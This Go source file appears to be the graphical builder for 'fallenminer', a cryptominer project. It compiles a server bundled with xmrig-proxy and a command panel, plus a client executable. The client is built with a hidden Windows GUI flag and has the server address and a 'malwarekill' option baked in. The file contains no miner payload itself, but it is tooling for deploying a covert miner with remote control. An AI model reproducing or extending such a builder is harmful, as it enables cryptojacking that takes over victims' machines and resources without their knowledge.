package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/dialog"
)

func copyFile(src, dest string) error {

	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dest, data, 0644)
	if err != nil {
		return err
	}

	return nil
}

func CopyFolder(src, dst string) error {

	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	err = os.MkdirAll(dst, srcInfo.Mode())
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := src + "/" + entry.Name()
		dstPath := dst + "/" + entry.Name()

		if entry.IsDir() {
			err = CopyFolder(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {

			err = copyFile(srcPath, dstPath)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func isGoVersionSupported() bool {

	version, err := getGoVersion()
	if err != nil {
		fmt.Println("Error checking Go version:", err)
		return false
	}

	re := regexp.MustCompile(`go(\d+\.\d+)`)
	matches := re.FindStringSubmatch(version)
	if len(matches) < 2 {
		return false
	}
	versionNumber := matches[1]

	return versionNumber >= "1.18"
}

func getGoVersion() (string, error) {
	cmd := exec.Command("go", "version")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to run 'go version': %v", err)
	}
	return string(output), nil
}

func isGCCInstalled() bool {
	cmd := exec.Command("gcc", "--version")
	err := cmd.Run()
	if err != nil {
		if strings.Contains(err.Error(), "executable file not found") {
			return false
		}
		fmt.Println("Error checking GCC installation:", err)
		return false
	}
	return true
}

func buildall(serveraddress string, serverbuild bool, malwarekill bool, window fyne.Window) error {
	err := os.MkdirAll("bin", 0755)
	if err != nil {
		return fmt.Errorf("failed to create bin directory: %v", err)
	}
	if serverbuild {
		buildserver(window)
	}
	buildclient(serveraddress, serverbuild, malwarekill, window)

	return nil

}

func buildserver(window fyne.Window) {

	originalDir, err := os.Getwd()
	if err != nil {
		dialog.ShowInformation("Error building server", err.Error(), window)
	}
	defer os.Chdir(originalDir)

	serverDir := filepath.Join(originalDir, "Server")
	err = os.Chdir(serverDir)
	if err != nil {
		dialog.ShowInformation("Error building server", err.Error(), window)
	}

	binDir := filepath.Join(originalDir, "bin", "server")
	err = os.MkdirAll(binDir, 0755)
	if err != nil {
		dialog.ShowInformation("Error building server", err.Error(), window)
	}

	outputBinary := filepath.Join(binDir, "fallenminer-server.exe")
	buildCmd := exec.Command("go", "build", "-o", outputBinary)
	_, err = buildCmd.CombinedOutput()
	if err != nil {
		dialog.ShowInformation("Error building server", err.Error(), window)
	}
	CopyFolder(serverDir+"\\assets", binDir+"\\assets")
	CopyFolder(serverDir+"\\views", binDir+"\\views")
	copyFile(serverDir+"\\server.db", binDir+"\\server.db")
	copyFile(serverDir+"\\xmrig-proxy.exe", binDir+"\\xmrig-proxy.exe")
	copyFile(serverDir+"\\runserver.bat", binDir+"\\runserver.bat")

	dialog.ShowInformation("Server", "Server built. Check /bin/server/ folder.", window)

}

func buildclient(serveraddress string, usepanel bool, malwarekill bool, window fyne.Window) {
	originalDir, err := os.Getwd()
	if err != nil {
		dialog.ShowInformation("Error building client", err.Error(), window)
	}
	defer os.Chdir(originalDir)

	clientDir := filepath.Join(originalDir, "Client")
	err = os.Chdir(clientDir)
	if err != nil {
		dialog.ShowInformation("Error building client", err.Error(), window)
	}

	binDir := filepath.Join(originalDir, "bin", "client")
	err = os.MkdirAll(binDir, 0755)
	if err != nil {
		dialog.ShowInformation("Error building client", err.Error(), window)
	}

	outputBinary := filepath.Join(binDir, "fallenminer.exe")

	if usepanel {
		if malwarekill {
			buildCmd := exec.Command(
				"go", "build",
				"-o", outputBinary,
				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "1"),
				"-tags", "panel",
			)
			_, err = buildCmd.CombinedOutput()
			if err != nil {
				dialog.ShowInformation("Error building client", err.Error(), window)
			}
			dialog.ShowInformation("Client built.", "Check /bin/client", window)
		} else {
			buildCmd := exec.Command(
				"go", "build",
				"-o", outputBinary,
				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "0"),
				"-tags", "panel",
			)
			_, err = buildCmd.CombinedOutput()
			if err != nil {
				dialog.ShowInformation("Error building client", err.Error(), window)
			}
			dialog.ShowInformation("Client built.", "Check /bin/client", window)
		}

	} else {
		if malwarekill {
			buildCmd := exec.Command(
				"go", "build",
				"-o", outputBinary,
				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "1"),
			)
			_, err = buildCmd.CombinedOutput()
			if err != nil {
				dialog.ShowInformation("Error building client", err.Error(), window)
			}
			dialog.ShowInformation("Client built.", "Check /bin/client", window)
		} else {
			buildCmd := exec.Command(
				"go", "build",
				"-o", outputBinary,
				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "0"),
			)
			_, err = buildCmd.CombinedOutput()
			if err != nil {
				dialog.ShowInformation("Error building client", err.Error(), window)
			}
			dialog.ShowInformation("Client built.", "Check /bin/client", window)
		}

	}

}
